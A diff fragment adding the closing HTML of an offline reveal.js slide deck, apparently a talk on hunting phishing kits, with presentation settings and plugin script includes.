881659167,"font_typekit":null,"font_google":null,"time_limit":null,"upsizing_enabled":true,"notes":{"e54fa4c9423423ec17cb9ae234c2f3b8":"errorcheck.php"}}};
+
+
+			// Use local fonts
+			SLConfig.fonts_url = 'lib/hunting-for-phishkits/fonts/';
+		</script>
+
+		<script src="lib/hunting-for-phishkits/reveal.min.js"></script>
+		<script src="lib/hunting-for-phishkits/offline.js"></script>
+
+		<!-- Initialize the presentation -->
+		<script>
+			Reveal.initialize({
+				width: 1920,
+				height: 1080,
+				margin: 0.05,
+				
+
+				hash: true,
+				controls: true,
+				progress: true,
+				mouseWheel: false,
+				showNotes: false,
+				slideNumber: false,
+
+				autoSlide: 0,
+				autoSlideStoppable: true,
+
+				center: false,
+				shuffle: false,
+				loop: false,
+				rtl: false,
+
+				transition: "slide",
+				backgroundTransition: "slide",
+
+				highlight: {
+					escapeHTML: false
+				},
+
+				dependencies: [
+					{ src: 'lib/hunting-for-phishkits/reveal-plugins/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'lib/hunting-for-phishkits/reveal-plugins/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'lib/hunting-for-phishkits/reveal-plugins/highlight/highlight.js' },
+					{ src: 'lib/hunting-for-phishkits/reveal-plugins/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } },
+					{ src: 'lib/hunting-for-phishkits/reveal-plugins/zoom/zoom.js', async: true }
+				]
+			});
+		</script>
+
+		
+
+	</body>
+</html>
